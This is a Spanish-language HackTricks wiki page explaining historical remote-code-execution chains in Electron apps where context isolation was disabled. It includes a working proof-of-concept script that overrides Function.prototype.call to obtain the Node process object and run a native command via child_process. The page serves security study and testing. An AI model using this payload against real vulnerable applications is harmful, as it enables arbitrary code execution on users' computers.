# RCE de Electron mediante código interno y aislamiento de contexto

{{#include ../../banners/hacktricks-training.md}}

Estos son **patrones históricos de explotación** para aplicaciones Electron que ejecutaban contenido no confiable en el renderer sin aislamiento de contexto. El aislamiento de contexto está habilitado de forma predeterminada desde Electron 12 y sigue siendo una configuración de seguridad recomendada.<sup>[[1]](#references)</sup> Los detalles internos varían según las versiones de Electron y Node.js, así que reproduce la cadena de explotación con las versiones incluidas en la aplicación objetivo.

## Ejemplo 1: sobrescribir `Function.prototype.call`

Este ejemplo proviene de la presentación de Masato Kinugawa en CureCon.<sup>[[2]](#references)</sup>

En la compilación histórica de Electron afectada, el código interno de ASAR registraba un listener de `exit` del proceso. Como el código de la página y el código interno de Electron compartían prototipos de JavaScript cuando el aislamiento de contexto estaba deshabilitado, el código del renderer podía reemplazar `Function.prototype.call` antes de que se ejecutara el listener interno.<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```javascript
process.on("exit", function () {
  for (let p in cachedArchives) {
    if (!hasProp.call(cachedArchives, p)) continue
    cachedArchives[p].destroy()
  }
})
```

![Ruta de código interno de asar.js de Electron usada en el ejemplo de RCE mediante contextIsolation](<../../images/image (1070).png>)

El listener se despachó mediante el mecanismo de eventos de Node.js. La página original enlazaba a una ruta obsoleta `bin/events.js`; el código fuente vigente de ese mismo commit histórico está en `lib/events.js`.<sup>[[5]](#references)</sup>

![Ruta de código de events.js de Node alcanzada por la cadena de RCE mediante contextIsolation de Electron](<../../images/image (793).png>)

En esta ruta, `self` es el objeto process de Node.js:

![RCE mediante contextIsolation de Electron a través de código interno de Electron - Ejemplo 1: Dónde "self" es el objeto process de Node](<../../images/image (700).png>)

El objeto process histórico exponía una ruta a `require`:

```
process.mainModule.require
```

Como el dispatcher del listener invocaba el handler con el objeto `process`, sobrescribir `call` permitía recuperar ese objeto y ejecutar un comando nativo:

```html
<script>
  Function.prototype.call = function (process) {
    process.mainModule.require("child_process").execSync("calc")
  }
  location.reload() // Trigger the listener during navigation
</script>
```

## Ejemplo 2: prototype pollution

La presentación de ElectroVolt demuestra otra cadena histórica que obtiene un objeto `require` mediante prototype pollution.<sup>[[4]](#references)</sup>

Leak:

<figure><img src="../../images/image (279).png" alt=""><figcaption></figcaption></figure>

Exploit:

<figure><img src="../../images/image (89).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Documentación de Electron - Aislamiento de contexto](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [2] [Electron: Aprovechar la falta de aislamiento de contexto - CureCon](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)
- [3] [Código fuente histórico de Electron - lib/common/asar.js](https://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36)
- [4] [ElectroVolt: Pwning aplicaciones de escritorio populares mientras se descubre una nueva superficie de ataque en Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [5] [Código fuente histórico de Node.js - despacho de listeners de `lib/events.js`](https://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/lib/events.js#L156-L231)
{{#include ../../banners/hacktricks-training.md}}
